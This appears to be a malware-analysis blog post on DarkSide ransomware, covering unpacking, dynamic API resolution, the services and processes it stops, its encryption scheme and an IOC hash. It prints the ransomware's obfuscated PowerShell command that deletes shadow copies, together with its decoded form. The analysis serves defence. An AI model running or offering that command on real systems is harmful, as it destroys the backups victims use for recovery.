---
title: DarkSide ransomware analysis
header: 
  teaser: /assets/img/debug-mode.png
date: 2020-10-05
---

This blog post will try to explain how the ransomware called DarkSide works. Based on my research, this ransomware uses Salsa20 encryption to encrypt files and RSA encryption to encrypt the key used by Salsa20. A new key is created per file based on random bytes.

> A new ransomware operation named DarkSide began attacking  organizations earlier this month with customized attacks that have  already earned them million-dollar payouts.
>
> Starting around August 10th, 2020, the new ransomware operation began performing targeted attacks against numerous companies.
>
> In a "press release" issued by the threat actors, they claim to be  former affiliates who had made millions of dollars working with other  ransomware operations. [https://www.bleepingcomputer.com/news/security/darkside-new-targeted-ransomware-demands-million-dollar-ransoms/amp/](https://www.bleepingcomputer.com/news/security/darkside-new-targeted-ransomware-demands-million-dollar-ransoms/amp/)

### Unpacking

The executable is compressed with UPX

```bash
file 9cee5522a7ca2bfca7cd3d9daba23e9a30deb6205f56c12045839075f7627297
[...]: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed
```

After the first instruction `pushad` I put a breakpoint on the `ESP` register and continue.

![image-20200901081829708]({{site.url}}/assets/img/image-20200901081829708.png)

The execution breaks on the instruction `lea eax, dword ptr ss:[esp80]`. After the loop is executed it jumps to the entry point of the packed executable.

![image-20200901082347454]({{site.url}}/assets/img/image-20200901082347454.png)

![image-20200901082212110]({{site.url}}/assets/img/image-20200901082212110.png)

Once the executable is unpacked, we can analyze the ransomware

### Anti-analysis

To make static analysis harder the ransomware resolves DLL's and API calls dynamically using `LoadLibrary`, `GetProcAddress` and 2 custom functions shown below. In this screenshot, the address of `_wcsicmp` is resolved in memory.

![image-20201004200251105]({{site.url}}/assets/img/image-20201004200251105.png)

![image-20201004200355620]({{site.url}}/assets/img/image-20201004200355620.png)

### Preparation

The mutex `Global\\3e93e49583d6401ba148cd68d1f84af7` is created to make sure only one copy of the ransomware is running, otherwise the ransomware exits. This is done based on the name of the executable. Then  `SetThreadExecutionState` is called to force the system to be in the working state by resetting the system idle timer.

**Services**

To make sure certain services are not running the following services are stopped using `ControlService - SERVICE_CONTROL_STOP` and `DeleteService`. Deleting a service is not useful if an organization pays the ransom and wants to go back into production quickly. As a system administrator, I wouldn't be happy about this.

* vss
* sql
* svc$
* memtas
* mepocs
* sophos
* veeam
* backup

![image-20201003214248340]({{site.url}}/assets/img/image-20201003214248340.png)

**Shadow Copies**

Using `CreateProcessW` the following Powershell script is executed which deletes Shadow Volume Copies.

```
powershell -ep bypass -c \"(0..61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))};iex $s\"
```

> When deobfuscated, we can see that this PowerShell command is used to delete Shadow Volume Copies on the machine before encrypting it.
>
> ```
> Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
> ```
> [https://www.bleepingcomputer.com/news/security/darkside-new-targeted-ransomware-demands-million-dollar-ransoms/amp/](https://www.bleepingcomputer.com/news/security/darkside-new-targeted-ransomware-demands-million-dollar-ransoms/amp/)

**Processes**

To make sure certain processes are not running a list of processes are terminated ([https://pastebin.com/WWSQxhcq](https://pastebin.com/WWSQxhcq).


![image-20201003215639745]({{site.url}}/assets/img/image-20201003215639745.png)

### Encryption

The encryption routine skips a few  files, file extensions and directories ([https://pastebin.com/WWSQxhcq](https://pastebin.com/WWSQxhcq)).

### Encryption flowchart

The encryption routine of the ransomware is shown below.

![image-20201004223437262]({{site.url}}/assets/img/image-20201004223437262.png)

### Debugging mode

I don't know why but it seems the authors have forgotten to disable debugging functionality in their code or maybe they are using this to verify that the files are encrypted. (XXX = file name). This file was in the same directory as the executable.

```
[INF] Start Encrypting All Files
[INF] Emptying Recycle Bin
[INF] Uninstalling Services
[INF] Deleting Shadow Copies
[INF] Terminating Processes
[INF] Encrypt Mode - FAST
[INF] Encrypting Local Disks
[INF] Started 8 I/O Workers
[INF] Start Encrypt [Handle 492] \\?\C:\XXX
[INF] File Encrypted Successful [Handle 492]
[INF] Start Encrypt [Handle 640] \\?\C:\XXX
[INF] File Encrypted Successful [Handle 640]
[INF] Start Encrypt [Handle 640] \\?\C:\XXX
[...]
```

### IOC

SHA256 - `9cee5522a7ca2bfca7cd3d9daba23e9a30deb6205f56c12045839075f7627297`

### References

[https://www.bleepingcomputer.com/news/security/darkside-new-targeted-ransomware-demands-million-dollar-ransoms/amp/](https://www.bleepingcomputer.com/news/security/darkside-new-targeted-ransomware-demands-million-dollar-ransoms/amp/)

[https://tria.ge/200828-r31s5nvvm2/behavioral1](https://tria.ge/200828-r31s5nvvm2/behavioral1)
